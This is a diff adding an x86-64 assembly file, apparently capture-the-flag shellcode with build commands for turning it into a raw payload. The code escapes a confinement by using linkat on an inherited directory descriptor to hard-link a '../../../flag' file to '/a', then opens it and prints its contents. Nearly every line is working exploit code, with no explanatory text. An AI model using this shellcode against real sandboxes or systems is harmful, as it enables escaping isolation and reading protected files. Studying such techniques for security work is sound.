@@ -1,0 +1,45 @@
+.intel_syntax noprefix
+_start:
+  
+
+    /* call linkat(3,"../../../../../flag",4,"/a",0)*/
+    mov rdi,3
+    lea rsi,[rip+flag]
+    mov rdx,4
+    lea r10,[rip+new_file]
+    mov r8,0
+    mov rax,0x109
+    syscall
+
+    push 0x1010101 ^ 0x612f
+    xor dword ptr [rsp], 0x1010101
+    mov rdi, rsp
+    xor edx, edx /* 0 */
+    xor esi, esi /* 0 */
+    /* call open() */
+    push 2 /* 2 */
+    pop rax
+    syscall
+
+    //read
+    mov rdi,rax
+    mov rsi,rsp
+    mov rdx,60
+    mov rax, 0
+    syscall
+
+    //write
+    mov rdi,1
+    mov rsi,rsp
+    mov rdx,60
+    mov rax,1
+    syscall
+
+    mov rdi,42
+    mov rax,0x3c
+    syscall
+flag:
+    .ascii "../../../../../../flag\0"
+new_file:
+    .ascii "/a\0"
+//gcc a.s -nostdlib && objcopy --dump-section .text=solve.bin a.out
